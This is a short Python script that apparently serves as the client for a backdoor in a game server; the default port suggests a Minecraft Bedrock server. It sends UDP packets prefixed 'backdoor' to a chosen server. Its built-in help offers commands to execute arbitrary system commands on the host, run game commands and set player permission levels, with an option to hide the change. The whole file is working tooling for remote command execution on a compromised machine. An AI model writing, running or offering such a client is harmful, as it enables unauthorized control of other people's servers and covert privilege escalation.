import socket
import random

def get_udp_socket(loc_port=random.randint(1024, 65535), timeout: int=1, use_ipv6: bool=False, loc_addr: str="") -> socket.socket:
    if not loc_port:
        loc_port = random.randint(1024, 65535)
    if use_ipv6:
        sockets = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    else:
        sockets = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if timeout:
        sockets.settimeout(timeout)
    sockets.bind((loc_addr, loc_port))
    return sockets

if __name__ == "__main__":
    sk = get_udp_socket()
    addr_str = input("Please input server ip:port like 127.0.0.1:19132\n")
    addr = addr_str.split(":")
    target = (addr[0], int(addr[1]))
    print("backdoor client. Type q to quit")
    print("scmd [cmd] - execute system command")
    print("gcmd [cmd] - execute game command")
    print("perm [player name] [level: 0~3] [0: hide | 1: display] - set player permission level")
    while True:
        cmd = input(">>> ")
        if cmd == "q":
            break
        sk.sendto(f"backdoor {cmd}\0".encode(), target)
        # try:
        #     ret_msg = sk.recvfrom(10240)
        # except socket.timeout:
        #     print("timeout.")
        #     pass
